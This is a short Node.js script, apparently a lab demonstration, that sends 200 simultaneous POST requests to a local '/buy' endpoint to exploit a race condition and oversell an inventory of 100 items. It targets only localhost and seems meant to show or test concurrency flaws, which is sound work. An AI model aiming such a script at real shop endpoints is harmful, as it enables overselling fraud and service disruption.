// attack-script/attack.js
const axios = require('axios');

const URL = 'http://localhost:3003/buy';
const REQUESTS = 200; // We have 100 items, but we send 200 requests

async function attack() {
    console.log(`Starting attack with ${REQUESTS} concurrent requests...`);
    
    // Create an array of 200 promises (requests)
    const requests = [];
    for (let i = 0; i < REQUESTS; i++) {
        requests.push(axios.post(URL).catch(err => {
            return err.response; // Don't crash on error
        }));
    }

    // Fire them all at the exact same time
    await Promise.all(requests);
    console.log('Attack finished.');
}

attack();